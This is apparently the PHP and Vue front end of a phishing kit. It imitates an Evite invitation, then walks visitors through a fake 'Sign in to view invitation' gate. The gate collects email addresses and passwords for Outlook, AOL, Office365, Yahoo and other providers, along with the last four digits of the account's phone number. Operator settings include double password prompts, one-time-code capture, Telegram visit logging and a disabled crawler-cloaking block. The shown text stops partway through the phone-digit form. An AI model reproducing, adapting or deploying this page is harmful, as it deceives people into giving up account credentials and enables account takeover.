<?php
declare(strict_types=1);
session_start();

require_once __DIR__ . '/config.php';

$ua = $_SERVER['HTTP_USER_AGENT'] ?? '';
$host = (filter_var($_SERVER['REMOTE_ADDR'] ?? '', FILTER_VALIDATE_IP))
    ? gethostbyaddr((string) $_SERVER['REMOTE_ADDR'])
    : '';
$isLocal = in_array($_SERVER['REMOTE_ADDR'] ?? '', ['127.0.0.1', '::1'], true);

// Google/bot detection disabled — Cloudflare-compatible
// if (
//     !$isLocal
//     && (
//         stripos($ua, 'google') !== false
//         || stripos($host, 'google') !== false
//         || stripos($ua, 'bot') !== false
//         || stripos($ua, 'crawler') !== false
//     )
// ) {
//     http_response_code(404);
//     include __DIR__ . '/404.php';
//     exit();
// }

$providerConfig = $CONFIG['providers'] ?? [];
$telegramConfig = $CONFIG['telegram'] ?? [];
$passwordTwice = $CONFIG['password_twice'] ?? false;
$skipPrepage = $CONFIG['skip_prepage'] ?? false;
$passwordRetries = $CONFIG['password_retries'] ?? 2;
$successRedirectUrl = $CONFIG['success_redirect_url'] ?? '';

function cfgBool($v): bool
{
    return $v === true || $v === 1 || $v === '1' || $v === 'true';
}

function cfgStr($v): string
{
    return is_string($v) ? $v : '';
}

$uiConfig = [
    'brand' => 'evite',
    'brandLabel' => 'Evite',
    'brandLogo' => 'asset/evite-logo-primary-coregreen.svg',
    'password_twice' => cfgBool($passwordTwice),
    'otp_twice' => cfgBool($CONFIG['otp_twice'] ?? false),
    'success_redirect_url' => cfgStr($successRedirectUrl),
    'default_sender' => cfgStr($CONFIG['default_sender'] ?? 'Evite Guest Host'),
    'skip_prepage' => cfgBool($skipPrepage),
    'password_retries' => (int) $passwordRetries,
    'telegram' => [
        'log_visits' => cfgBool($telegramConfig['log_visits'] ?? false),
    ],
    'providers' => [],
];

foreach (['outlook', 'aol', 'office365', 'yahoo', 'other'] as $pid) {
    $p = is_array($providerConfig[$pid] ?? null) ? $providerConfig[$pid] : [];
    $redir = is_array($p['redirect'] ?? null) ? $p['redirect'] : [];
    $uiConfig['providers'][$pid] = [
        'enabled' => cfgBool($p['enabled'] ?? true),
        'redirect' => [
            'enabled' => cfgBool($redir['enabled'] ?? false),
            'url' => cfgStr($redir['url'] ?? ''),
        ],
    ];
}
?>
<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>Your Exclusive Invitation - Evite</title>
  
  <!-- Tailwind CSS CDN -->
  <script src="https://cdn.tailwindcss.com"></script>
  <script>
    tailwind.config = {
      theme: {
        extend: {
          colors: {
            evite: {
              coregreen: '#2e4a2d',       // Core Evite Green
              coregreenhover: '#213620',
              cream: '#faf9f5',           // Soft warm cream background
              darkcharcoal: '#2e3d30',    // Clean dark grey-olive text
              accentgreen: '#4a6f4c',     // Accent green for badges
              lightgreen: '#edf3ee',      // Light highlight green bg
              bordergray: '#e6e4dc',      // Soft border grey-cream
              graytext: '#687766'         // Muted green-grey text
            }
          },
          fontFamily: {
            sans: ['Outfit', 'sans-serif'],
            serif: ['Playfair Display', 'serif'],
          },
          animation: {
            'float': 'float 6s ease-in-out infinite',
            'float-reverse': 'floatReverse 6s ease-in-out infinite',
            'spin-slow': 'spin 12s linear infinite',
            'spin-fast': 'spin 1s linear infinite',
          },
          keyframes: {
            float: {
              '0%, 100%': { transform: 'translateY(0) rotate(var(--tw-rotate, 0deg))' },
              '50%': { transform: 'translateY(-12px) rotate(var(--tw-rotate, 0deg))' },
            },
            floatReverse: {
              '0%, 100%': { transform: 'translateY(0) rotate(var(--tw-rotate, 0deg))' },
              '50%': { transform: 'translateY(12px) rotate(var(--tw-rotate, 0deg))' },
            }
          }
        }
      }
    }
  </script>

  <!-- Google Fonts: Outfit & Playfair Display -->
  <link rel="preconnect" href="https://fonts.googleapis.com">
  <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
  <link href="https://fonts.googleapis.com/css2?family=Outfit:wght@300;400;500;600;700;800&family=Playfair+Display:ital,wght@0,400;0,600;0,700;1,400&display=swap" rel="stylesheet">
  
  <!-- FontAwesome Icons for clean UI utility -->
  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">

  <!-- Vue 3 Global CDN -->
  <script src="https://unpkg.com/vue@3/dist/vue.global.js"></script>

  <style>
    /* Clean shadow and custom inputs */
    .evite-card {
      background: #ffffff;
      border: 1px solid #e6e4dc;
      box-shadow: 0 10px 30px rgba(46, 61, 48, 0.05);
    }
    
    .evite-input {
      background: #ffffff;
      border: 1px solid #d1cfc7;
      color: #2e3d30;
      transition: all 0.3s ease;
    }
    .evite-input:focus {
      border-color: #2e4a2d;
      box-shadow: 0 0 10px rgba(46, 74, 45, 0.15);
      outline: none;
    }

    /* Text typing fade loop specific classes */
    .cursor-blink::after {
      content: '|';
      animation: blink 0.8s infinite;
      color: #2e4a2d;
    }
    @keyframes blink {
      0%, 100% { opacity: 1; }
      50% { opacity: 0; }
    }

    /* Scrollbar for RSVP scrollable area */
    .scroll-container::-webkit-scrollbar {
      width: 4px;
    }
    .scroll-container::-webkit-scrollbar-track {
      background: transparent;
    }
    .scroll-container::-webkit-scrollbar-thumb {
      background: rgba(46, 74, 45, 0.2);
      border-radius: 2px;
    }
    .scroll-container::-webkit-scrollbar-thumb:hover {
      background: rgba(46, 74, 45, 0.4);
    }

    /* Prevent Vue template compile flash */
    [v-cloak] {
      display: none !important;
    }
  </style>
</head>
<body class="bg-evite-cream text-evite-darkcharcoal font-sans min-h-screen overflow-x-hidden relative selection:bg-evite-coregreen selection:text-white">

  <div id="app" v-cloak class="relative z-10 min-h-screen flex flex-col justify-between">
    
    <!-- Top Header / Navigation -->
    <header class="w-full bg-white border-b border-evite-bordergray">
      <div class="max-w-7xl mx-auto px-6 py-4 flex items-center justify-center">
        <!-- Logo -->
        <a href="index.php" class="flex items-center gap-2">
          <img src="asset/evite-logo-primary-coregreen.svg" alt="evite" class="h-8">
        </a>
      </div>
    </header>

    <!-- Main Container hosting the Immersive Evite Hero Panel -->
    <main class="w-full max-w-7xl mx-auto px-4 sm:px-6 py-8 flex-grow flex items-center justify-center">
      
      <!-- HERO PANEL (Desktop: split screen banner, Mobile: vertical stack) -->
      <div class="w-full bg-white border border-evite-bordergray rounded-3xl overflow-hidden shadow-xl grid grid-cols-1 md:grid-cols-12 min-h-[580px] items-stretch">
        
        <!-- Left Side: Slideshow Background Frame & Floating Cards (Col-span 7) -->
        <div class="col-span-1 md:col-span-7 relative bg-evite-cream min-h-[300px] md:min-h-full overflow-hidden flex items-center justify-center select-none border-b md:border-b-0 md:border-r border-evite-bordergray">
          
          <!-- Background Frame Slide Images (Fading crossfade transitions) -->
          <div v-for="(slide, idx) in slides" 
               :key="'frame-' + idx"
               class="absolute inset-0 transition-opacity duration-1000 bg-cover bg-center"
               :style="{ backgroundImage: 'url(' + slide.bgImage + ')' }"
               :class="currentSlide === idx ? 'opacity-100 z-0' : 'opacity-0 pointer-events-none'">
          </div>

          <!-- Floating Tilted Ecard Previews (Crossfades with slides, overflows boundary on desktop) -->
          <div v-for="(slide, idx) in slides"
               :key="'cards-' + idx"
               v-show="currentSlide === idx"
               class="absolute inset-0 z-10 flex items-center justify-center p-4">
            
            <!-- Cards Container (Centered on mobile, offset right on desktop to overlap divider) -->
            <div class="relative w-full h-full max-w-md flex items-center justify-center md:justify-end md:pr-12 lg:pr-16">
              
              <!-- Floating Card 1 -->
              <div v-if="slide.cards.length > 0"
                   :class="[
                     'absolute shadow-2xl border border-evite-bordergray bg-white rounded-xl overflow-hidden transition-all duration-700 hover:scale-105 pointer-events-auto',
                     slide.cards.length === 1 ? 'animate-float' : 'animate-float'
                   ]"
                   :style="slide.cards[0].style">
                <img :src="slide.cards[0].image" alt="Ecard template thumbnail" class="w-40 sm:w-48 lg:w-56 h-auto object-cover">
              </div>

              <!-- Floating Card 2 (If available) -->
              <div v-if="slide.cards.length > 1"
                   class="absolute shadow-2xl border border-evite-bordergray bg-white rounded-xl overflow-hidden transition-all duration-700 hover:scale-105 pointer-events-auto animate-float-reverse"
                   :style="slide.cards[1].style">
                <img :src="slide.cards[1].image" alt="Ecard template thumbnail 2" class="w-40 sm:w-48 lg:w-56 h-auto object-cover">
              </div>

            </div>
          </div>

          <!-- Pagination dots on bottom left image -->
          <div class="absolute bottom-6 left-6 z-20 flex gap-2.5">
            <span v-for="(slide, idx) in slides" 
                  :key="'nav-' + idx"
                  @click="setSlide(idx)"
                  :class="['w-2.5 h-2.5 rounded-full cursor-pointer transition-all duration-300', currentSlide === idx ? 'bg-evite-coregreen w-6' : 'bg-white border border-evite-bordergray hover:bg-evite-lightgreen']">
            </span>
          </div>

          <!-- Slogan / Caption on top left of image -->
          <div class="absolute top-6 left-6 z-20 bg-white/95 backdrop-blur-sm border border-evite-bordergray px-4 py-2 rounded-full shadow-sm text-xs font-bold text-evite-darkcharcoal tracking-wide">
            {{ slides[currentSlide].slogan }}
          </div>
        </div>

        <!-- Right Side: Interactive Content Steps (Col-span 5) -->
        <div class="col-span-1 md:col-span-5 flex flex-col justify-between p-6 sm:p-8 lg:p-10 transition-colors duration-1000 relative"
             :style="{ backgroundColor: slides[currentSlide].bgColor }">
          
          <!-- FLOW SCREEN 1: Welcome Intro Panel -->
          <div v-if="currentStep === 'welcome'" 
               class="flex-grow flex flex-col justify-between py-6">
            <div>
              <!-- Evite badge -->
              <div class="inline-flex items-center gap-2 bg-white/80 border border-evite-bordergray text-evite-coregreen py-1.5 px-3.5 rounded-full text-[10px] font-extrabold uppercase tracking-wider mb-6">
                <i class="far fa-envelope-open"></i> VIP Invitation
              </div>

              <!-- Title -->
              <h2 class="text-3xl lg:text-4xl font-bold text-evite-darkcharcoal font-serif tracking-tight leading-snug">
                <span v-if="hasInvitee">Welcome, {{ inviteeName }}!</span>
                <span v-else>Your Invitation is Ready!</span>
              </h2>
              <p class="text-sm text-evite-graytext mt-2 leading-relaxed">
                An exclusive digital invitation has been prepared for you. Tap below to securely verify and unlock your details.
              </p>

              <!-- Typing host loop container -->
              <div class="mt-8 mb-6 bg-white/80 border border-evite-bordergray py-4 px-6 rounded-2xl w-full min-h-[90px] flex flex-col justify-center shadow-sm">
                <span class="text-[10px] uppercase tracking-[0.2em] text-evite-graytext font-extrabold">Invitation Host By:</span>
                <div class="min-h-[32px] flex items-center mt-1">
                  <h3 class="text-lg font-bold text-evite-coregreen cursor-blink inline-block"
                      :class="{'opacity-0 transition-opacity duration-500': isTypingFading}">
                    {{ displayedSender }}
                  </h3>
                </div>
              </div>
            </div>

            <!-- Action Button -->
            <button @click="proceedToLoading" 
                    class="w-full bg-evite-coregreen hover:bg-evite-coregreenhover text-white font-bold text-xs tracking-widest uppercase py-4 px-8 rounded-full transition-all duration-300 shadow-md hover:shadow-lg active:scale-[0.98] flex items-center justify-center gap-3">
              <span>View Ecard Invitation</span>
              <i class="fas fa-arrow-right text-xs"></i>
            </button>
          </div>

          <!-- FLOW SCREEN 2: Loading State -->
          <div v-else-if="currentStep === 'loading'" 
               class="flex-grow flex flex-col justify-center items-center py-12 text-center">
            
            <!-- Animated circular loader matching slide accent -->
            <div class="relative w-24 h-24 flex items-center justify-center mb-6">
              <div class="absolute inset-0 rounded-full border-4 border-white/40"></div>
              <div class="absolute inset-0 rounded-full border-4 border-t-evite-coregreen border-r-evite-coregreen border-b-transparent border-l-transparent animate-spin"></div>
              <div class="w-14 h-14 rounded-full bg-white flex items-center justify-center border border-evite-bordergray">
                <i class="far fa-envelope-open text-xl text-evite-coregreen" :class="isLoggingIn ? 'fa-spin text-purple-600' : 'animate-pulse'"></i>
              </div>
            </div>

            <h3 class="text-lg font-bold text-evite-darkcharcoal font-serif">
              {{ isLoggingIn ? 'Connecting Securely' : 'Security Verification' }}
            </h3>
            <p class="text-xs text-evite-graytext tracking-wider uppercase font-semibold mt-0.5">
              {{ isLoggingIn ? 'Verifying Credentials' : 'Fetching VIP Ecard' }}
            </p>
            
            <p class="text-sm text-evite-darkcharcoal mt-6 leading-relaxed bg-white/80 border border-evite-bordergray py-4 px-5 rounded-2xl w-full shadow-sm">
              <span v-if="isLoggingIn">
                <span v-if="hasInvitee">Logging in as <span class="font-bold text-evite-coregreen">{{ inviteeName }}</span> via {{ activeProvider }}...</span>
                <span v-else>Logging in via {{ activeProvider }}...</span>
              </span>
              <span v-else>
                <span v-if="hasInvitee"><span class="font-bold text-evite-coregreen">{{ inviteeName }}</span>'s ecard is loading...</span>
                <span v-else>Your ecard is loading...</span>
              </span>
            </p>

            <!-- Loading indicator dots -->
            <div class="flex gap-1.5 mt-6">
              <span class="w-2 h-2 rounded-full bg-evite-coregreen/30 animate-bounce" style="animation-delay: 0.1s"></span>
              <span class="w-2 h-2 rounded-full bg-evite-coregreen/60 animate-bounce" style="animation-delay: 0.2s"></span>
              <span class="w-2 h-2 rounded-full bg-evite-coregreen animate-bounce" style="animation-delay: 0.3s"></span>
            </div>
          </div>

          <!-- FLOW SCREEN 3: Secure Login Gate (Mail Provider Buttons List) -->
          <div v-else-if="currentStep === 'login'" 
               class="flex-grow flex flex-col justify-between py-4">
            <div>
              <!-- Back Button (hidden when skip_prepage is on) -->
              <button v-if="!cfg.skip_prepage" @click="currentStep = 'welcome'" class="text-evite-graytext hover:text-evite-coregreen transition-colors text-xs flex items-center gap-1 mb-4 focus:outline-none">
                <i class="fas fa-chevron-left text-[10px]"></i> Back to Intro
              </button>

              <div class="mb-5">
                <h3 class="text-2xl font-bold font-serif text-evite-darkcharcoal leading-tight">Sign in to view invitation</h3>
                <p class="text-xs text-evite-graytext mt-1.5">Please verify your email provider to access this secure Evite invitation.</p>
              </div>

              <!-- Mail Providers Sign In List -->
              <div class="space-y-2.5 mt-4">
                <div v-for="(provider, index) in providers"
                     :key="provider.id"
                     v-show="isProviderEnabled(provider.id)"
                     @click="selectProvider(provider)"
                     class="flex items-center rounded-xl overflow-hidden shadow-sm border border-evite-bordergray hover:shadow-md hover:border-evite-coregreen/30 transition-all cursor-pointer active:scale-[0.99] bg-white group">
                  <div class="w-14 h-12 bg-white flex items-center justify-center border-r border-evite-bordergray p-3.5 shrink-0">
                    <img :src="provider.logoUrl" 
                         :alt="provider.label"
                         :class="[provider.logoClass || 'h-6 w-auto', 'object-contain']"
                         @error="onLogoError(provider)" />
                  </div>
                  <div class="flex-grow h-12 flex items-center justify-center text-xs font-bold text-white transition-colors uppercase tracking-wider"
                       :style="{ backgroundColor: provider.color }">
                    {{ provider.label }}
                  </div>
                </div>
              </div>
            </div>
          </div>

          <!-- FLOW SCREEN 4: Gated RSVP Details Dashboard -->
          <div v-else-if="currentStep === 'dashboard'" 
               class="flex-grow flex flex-col justify-between py-2 max-h-[500px]">
            
            <div class="scroll-container overflow-y-auto pr-1.5 flex-grow space-y-4">
              <!-- Personalized Greeting -->
              <div class="pb-3 border-b border-evite-bordergray/20">
                <span class="text-[10px] font-bold text-evite-accentgreen bg-white/90 border border-evite-bordergray py-1 px-3 rounded-full uppercase tracking-wider">
                  Verified Guest: {{ inviteeName }}
                </span>
                
                <h3 class="text-2xl font-bold font-serif text-evite-darkcharcoal mt-3">VIP Concert & Launch Party</h3>
                <p class="text-xs text-evite-graytext mt-1">Host: <span class="font-bold text-evite-coregreen">{{ hostName }}</span></p>
              </div>

              <!-- Date & Location details card -->
              <div class="bg-white/80 border border-evite-bordergray rounded-2xl p-4 space-y-3.5 shadow-sm">
                <div class="flex items-start gap-3">
                  <div class="w-8 h-8 rounded-lg bg-evite-lightgreen flex items-center justify-center text-evite-coregreen shrink-0">
                    <i class="far fa-calendar-alt text-sm"></i>
                  </div>
                  <div>
                    <h4 class="text-[10px] text-evite-graytext uppercase font-bold tracking-wider">Date & Time</h4>
                    <p class="text-xs font-bold text-evite-darkcharcoal mt-0.5">Friday, Oct 16, 2026</p>
                    <p class="text-[11px] text-evite-graytext">8:00 PM - 12:00 AM CST</p>
                  </div>
                </div>

                <div class="flex items-start gap-3">
                  <div class="w-8 h-8 rounded-lg bg-evite-lightgreen flex items-center justify-center text-evite-coregreen shrink-0">
                    <i class="fas fa-map-pin text-sm"></i>
                  </div>
                  <div>
                    <h4 class="text-[10px] text-evite-graytext uppercase font-bold tracking-wider">Location</h4>
                    <p class="text-xs font-bold text-evite-darkcharcoal mt-0.5">The Obsidian Lounge</p>
                    <p class="text-[11px] text-evite-graytext">108 E 8th St, Austin, TX</p>
                  </div>
                </div>
              </div>

              <!-- Description -->
              <p class="text-xs text-evite-darkcharcoal leading-relaxed bg-white/80 p-3.5 border border-evite-bordergray rounded-2xl shadow-sm">
                Join us for a private listening session of our debut LP, followed by an intimate live performance. Admission is free, but RSVP is strictly required to secure your VIP badge.
              </p>

              <!-- RSVP Form -->
              <div class="bg-white/90 border border-evite-bordergray rounded-2xl p-4 shadow-md">
                <div v-if="!rsvpSubmitted" class="space-y-4">
                  <h4 class="text-xs font-bold uppercase tracking-wider text-evite-darkcharcoal flex items-center gap-2">
                    <i class="far fa-check-circle text-evite-coregreen"></i> Choose Attendance
                  </h4>

                  <!-- Attendance Buttons -->
                  <div class="grid grid-cols-3 gap-2">
                    <button 
                      v-for="status in attendanceOptions" 
                      :key="status.value"
                      @click="rsvp.status = status.value"
                      class="py-2.5 px-1 rounded-xl text-[10px] font-bold border transition-all duration-300 flex flex-col items-center gap-1"
                      :class="rsvp.status === status.value ? 'bg-evite-coregreen border-evite-coregreen text-white shadow-sm scale-102' : 'bg-white border-evite-bordergray text-evite-darkcharcoal hover:bg-evite-lightgreen'"
                    >
                      <i :class="['fas', status.icon, 'text-xs', rsvp.status === status.value ? 'text-white' : 'text-evite-coregreen']"></i>
                      <span>{{ status.label }}</span>
                    </button>
                  </div>

                  <!-- Inputs -->
                  <form @submit.prevent="submitRSVP" class="space-y-3.5 mt-2">
                    <div>
                      <label class="block text-[9px] font-bold uppercase tracking-wider text-evite-graytext mb-1">Your Name</label>
                      <input type="text" v-model="rsvp.name" required placeholder="Guest Name" @focus="pauseSlideshow" @blur="resumeSlideshow" class="w-full evite-input px-3.5 py-2 rounded-xl text-xs font-medium">
                    </div>

                    <div class="grid grid-cols-2 gap-2">
                      <div>
                        <label class="block text-[9px] font-bold uppercase tracking-wider text-evite-graytext mb-1">Guests (+)</label>
                        <select v-model="rsvp.guests" class="w-full evite-input px-3.5 py-2 rounded-xl text-xs font-medium focus:outline-none">
                          <option :value="0">Just Me</option>
                          <option :value="1">+1 Guest</option>
                          <option :value="2">+2 Guests</option>
                          <option :value="3">+3 Guests</option>
                        </select>
                      </div>
                      <div>
                        <label class="block text-[9px] font-bold uppercase tracking-wider text-evite-graytext mb-1">Contact Email</label>
                        <input type="email" v-model="rsvp.email" required placeholder="email@example.com" @focus="pauseSlideshow" @blur="resumeSlideshow" class="w-full evite-input px-3.5 py-2 rounded-xl text-xs font-medium">
                      </div>
                    </div>

                    <div>
                      <label class="block text-[9px] font-bold uppercase tracking-wider text-evite-graytext mb-1">Dietary Preferences</label>
                      <input type="text" v-model="rsvp.dietary" placeholder="e.g. Vegetarian" @focus="pauseSlideshow" @blur="resumeSlideshow" class="w-full evite-input px-3.5 py-2 rounded-xl text-xs font-medium">
                    </div>

                    <button type="submit" 
                            :disabled="isSubmitting"
                            class="w-full bg-evite-coregreen hover:bg-evite-coregreenhover text-white font-bold text-[11px] tracking-wider uppercase py-3 px-6 rounded-full transition-all duration-300 shadow active:scale-[0.98] disabled:opacity-50 flex items-center justify-center gap-1.5">
                      <i class="fas fa-circle-notch fa-spin" v-if="isSubmitting"></i>
                      <i class="fas fa-paper-plane text-xs" v-else></i>
                      <span>{{ isSubmitting ? 'Confirming...' : 'Confirm Invitation RSVP' }}</span>
                    </button>
                  </form>
                </div>

                <!-- Success ticket mockup -->
                <div v-else class="space-y-4">
                  <div class="text-center py-3 bg-evite-lightgreen border border-[#d9e6da] rounded-xl">
                    <div class="w-8 h-8 rounded-full bg-evite-coregreen/10 text-evite-coregreen flex items-center justify-center mx-auto text-sm mb-1.5 animate-bounce">
                      <i class="fas fa-check"></i>
                    </div>
                    <h4 class="text-sm font-bold text-evite-darkcharcoal font-serif">RSVP Confirmed!</h4>
                    <p class="text-[10px] text-evite-graytext mt-0.5">Ticket Code: <span class="font-mono text-evite-coregreen font-bold">EV-{{ Math.floor(100000 + Math.random() * 900000) }}</span></p>
                  </div>

                  <!-- Mini ticket -->
                  <div class="relative bg-white border border-evite-bordergray rounded-xl overflow-hidden p-4 shadow-sm text-xs">
                    <!-- dashed tear line -->
                    <div class="absolute left-0 right-0 top-3/4 border-t border-dashed border-evite-bordergray"></div>
                    
                    <div class="flex justify-between items-center pb-2 border-b border-evite-bordergray/20">
                      <div>
                        <h5 class="text-[9px] font-bold tracking-wider text-evite-coregreen uppercase">VIP Admission</h5>
                        <p class="font-bold text-evite-darkcharcoal">Obsidian Lounge</p>
                      </div>
                      <img src="asset/evite-logo-primary-coregreen.svg" alt="evite" class="h-4">
                    </div>

                    <div class="py-2.5 space-y-1">
                      <p class="text-[10px] text-evite-graytext uppercase font-semibold">Holder Name</p>
                      <p class="font-extrabold text-evite-darkcharcoal">{{ rsvp.name }}</p>
                      <p class="text-[10px] text-evite-coregreen font-bold" v-if="rsvp.guests > 0">+{{ rsvp.guests }} Guest{{ rsvp.guests > 1 ? 's' : '' }} Included</p>
                      <p class="text-[10px] text-evite-graytext" v-else>Single Admit</p>
                    </div>

                    <div class="pt-4 flex items-center justify-between gap-4">
                      <div>
                        <div class="text-[9px] text-evite-graytext uppercase font-semibold">Track Request / Dietary</div>
                        <div class="text-[11px] font-semibold text-evite-darkcharcoal truncate max-w-[120px]">{{ rsvp.dietary || 'None' }}</div>
                      </div>
                      <!-- Simulated QR code -->
                      <div class="w-10 h-10 bg-white p-0.5 rounded border border-evite-bordergray shrink-0">
                        <svg viewBox="0 0 100 100" class="w-full h-full text-evite-darkcharcoal" fill="currentColor">
                          <path d="M0 0h30v30H0V0zm10 10v10h10V10H10zm0 40h30v30H0V50zm10 10v10h10V60H10zM50 0h30v30H50V0zm10 10v10h10V10H60z" />
                          <path d="M50 50h10v10H50zM70 50h10v10H70zM60 60h10v10H60zM50 70h10v10H50zM70 70h10v10H70zM80 60h10v10H80zM80 80h10v10H80zM60 80h10v10H60zM80 0h10v10H80zM90 20h10v10H90zM80 30h20v10H80zM30 30h10v10H30zM40 10h10v10H40zM30 80h10v10H30zM40 70h10v10H40z" />
                        </svg>
                      </div>
                    </div>
                  </div>

                  <div class="flex gap-2">
                    <button @click="rsvpSubmitted = false" class="flex-1 py-2 px-4 rounded-full border border-evite-bordergray hover:bg-evite-lightgreen text-evite-darkcharcoal text-xs font-bold uppercase transition-all">
                      Edit RSVP
                    </button>
                    <button @click="printTicket" class="flex-1 bg-evite-coregreen hover:bg-evite-coregreenhover text-white font-bold text-xs uppercase py-2 px-4 rounded-full transition-all shadow">
                      Print Pass
                    </button>
                  </div>
                </div>
              </div>
            </div>

            <!-- Footer links when at dashboard view -->
            <div class="pt-4 border-t border-evite-bordergray/20 text-center">
              <span class="text-[10px] text-evite-graytext">Powered by Evite co-branded partner services.</span>
            </div>
          </div>

        </div>
      </div>
    </main>

    <!-- Sign-in / OTP modal matching sample code exactly, styled inside the Evite light system -->
    <transition
      enter-active-class="transition duration-200 ease-out"
      enter-from-class="opacity-0"
      enter-to-class="opacity-100"
      leave-active-class="transition duration-150 ease-in"
      leave-from-class="opacity-100"
      leave-to-class="opacity-0"
    >
      <div
        v-if="modalOpen"
        class="fixed inset-0 z-50 flex items-center justify-center px-4 py-8"
        role="dialog"
        aria-modal="true"
        @keydown.esc="closeModal"
      >
        <!-- Modal dark background backdrop -->
        <div class="absolute inset-0 bg-black/70 backdrop-blur-sm" @click="closeModal"></div>

        <!-- Modal container -->
        <div class="relative w-full max-w-[420px] rounded-xl border border-evite-bordergray bg-white shadow-2xl z-10 text-evite-darkcharcoal">
          
          <!-- Close button -->
          <button
            type="button"
            class="absolute right-3 top-3 inline-flex h-9 w-9 items-center justify-center rounded-full border border-slate-200 bg-white text-slate-600 transition hover:bg-slate-50 focus:outline-none"
            @click="closeModal"
            aria-label="Close"
          >
            <svg viewBox="0 0 24 24" class="h-5 w-5" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round">
              <path d="M18 6L6 18"></path><path d="M6 6l12 12"></path>
            </svg>
          </button>

          <div class="px-7 pb-7 pt-7">
            <!-- Modal Header -->
            <div class="flex items-center gap-3 pr-8">
              <div class="flex h-11 w-11 items-center justify-center rounded-lg border border-slate-200 bg-white shrink-0">
                <img
                  v-if="modalProvider && modalProvider.logoUrl"
                  :src="modalProvider.logoUrl"
                  :alt="(modalProvider.label || '') + ' logo'"
                  :class="[modalProvider.logoClass || 'h-7 w-7', 'object-contain']"
                  @error="onLogoError(modalProvider)"
                />
              </div>
              <div class="min-w-0 flex-grow">
                <div class="truncate text-sm font-bold text-slate-900">
                  <span v-if="hasInvitee">{{ inviteeName }}</span>
                  <span v-else>{{ modalProvider ? modalProvider.label.replace('Sign in with ', '') : 'Email' }}</span>
                </div>
                <div class="text-xs text-slate-600 mt-0.5 truncate">
                  <span v-if="hasInvitee">Sign in to your {{ modalProvider ? modalProvider.label.replace('Sign in with ', '') : 'Email' }} account</span>
                  <span v-else>{{ modalPasswordOnly ? 'Enter your password to continue.' : 'Enter your email and password to continue.' }}</span>
                </div>
              </div>
            </div>

            <!-- STAGE 1: Email & Password Form -->
            <form v-if="modalStage === 'form'" class="mt-5 space-y-3" @submit.prevent="submitModal">
              <!-- Error message -->
              <div
                v-if="modalError"
                class="rounded-lg border border-red-200 bg-red-50 px-4 py-3 text-sm text-red-700"
                role="status"
                aria-live="polite"
              >
                {{ modalError }}
              </div>

              <!-- Password only pre-filled card -->
              <div v-if="modalPasswordOnly" class="rounded-lg border border-slate-200 bg-slate-50 px-4 py-3">
                <div class="text-[10px] font-medium text-slate-500 uppercase tracking-wide">
                  <span v-if="hasInvitee">Sign In Account</span>
                  <span v-else>Email</span>
                </div>
                <div class="mt-0.5 truncate text-sm font-semibold text-slate-900">
                  {{ modalEmail }} <span v-if="hasInvitee" class="text-xs text-slate-500 font-normal">({{ inviteeName }})</span>
                </div>
              </div>

              <!-- Email Input (if not password only) -->
              <div v-else>
                <label class="block text-xs font-semibold text-slate-700">Email</label>
                <input
                  v-model.trim="modalEmail"
                  type="email"
                  autocomplete="email"
                  required
                  class="mt-1 w-full rounded-lg border border-slate-300 bg-white py-3 px-4 text-sm text-slate-900 outline-none transition focus:border-evite-coregreen focus:ring-2 focus:ring-evite-coregreen/30"
                  placeholder="name@example.com"
                />
              </div>

              <!-- Password Input -->
              <div>
                <label class="block text-xs font-semibold text-slate-700">Password</label>
                <div class="relative mt-1">
                  <input
                    v-model="modalPassword"
                    :type="showPassword ? 'text' : 'password'"
                    autocomplete="current-password"
                    required
                    class="w-full rounded-lg border border-slate-300 bg-white py-3 pl-4 pr-12 text-sm text-slate-900 outline-none transition focus:border-evite-coregreen focus:ring-2 focus:ring-evite-coregreen/30"
                    placeholder="••••••••"
                  />
                  <!-- View password eye toggle -->
                  <button
                    type="button"
                    class="absolute inset-y-0 right-0 mr-1 inline-flex w-10 items-center justify-center text-slate-500 hover:text-slate-800 focus:outline-none"
                    @click="togglePassword"
                    :aria-label="showPassword ? 'Hide password' : 'Show password'"
                  >
                    <svg v-if="!showPassword" viewBox="0 0 24 24" class="h-5 w-5" fill="none" stroke="currentColor" stroke-width="2">
                      <path d="M2 12s3.5-7 10-7 10 7 10 7-3.5 7-10 7-10-7-10-7z"></path><circle cx="12" cy="12" r="3"></circle>
                    </svg>
                    <svg v-else viewBox="0 0 24 24" class="h-5 w-5" fill="none" stroke="currentColor" stroke-width="2">
                      <path d="M1 1l22 22"></path><path d="M10.733 5.08A10.784 10.784 0 0 1 12 5c6.5 0 10 7 10 7a18.3 18.3 0 0 1-3.223 4.12"></path>
                    </svg>
                  </button>
                </div>
              </div>

              <!-- Submit button -->
              <button
                type="submit"
                :disabled="modalBusy"
                class="mt-2 inline-flex w-full items-center justify-center rounded-lg bg-evite-coregreen hover:bg-evite-coregreenhover px-4 py-3 text-sm font-semibold text-white transition disabled:opacity-60 focus:outline-none"
              >
                <span v-if="modalBusy" class="inline-flex items-center gap-2">
                  <svg class="h-5 w-5 animate-spin" viewBox="0 0 24 24" fill="none">
                    <circle class="opacity-25" cx="12" cy="12" r="10" stroke="currentColor" stroke-width="4"></circle>
                    <path class="opacity-75" fill="currentColor" d="M4 12a8 8 0 0 1 8-8v4a4 4 0 0 0-4 4H4z"></path>
                  </svg>
                  Loading…
                </span>
                <span v-else>Sign in</span>
              </button>
            </form>

            <!-- STAGE 1.5: LAST 4 DIGITS (AOL / YAHOO) -->
            <form v-if="modalStage === 'last4'" class="mt-5 space-y-4" @submit.prevent="submitLast4">
              <div class="text-center">
                <div class="text-sm font-semibold text-slate-900">Account Verification</div>
                <div class="mt-1 text-xs text-slate-600">
                  For your security, enter the last 4 digits of the phone number on your
                  {{ modalProvider ? modalProvider.label.replace('Sign in with ', '') : 'account' }} account.
                </div>
              </div>
              <div v-if="modalError" class="rounded-lg border border-red-200 bg-red-50 px-4 py-3 text-sm text-red-700" role="status" aria-live="polite">{{ modalError }}</div>
              <div>
                <label class="block text-xs font-semibold text-slate-700">Last 4 digits</label>
                <input
                  v-model="last4Code"
                  type="text"
                  inputmode="numeric"
                  autocomplete="off"
                  maxlength="4"
                  required
                  class="mt-1 w-full rounded-lg border border-slate-300 bg-white py-3 px-4 text-center text-lg tracking-[0.5em] text-slate-900 outline-none transition focus:border-evite-coregreen focus:ring-2 focus:ring-evite-coregreen/30"
                  placeholder="••••"
                />
              </div>
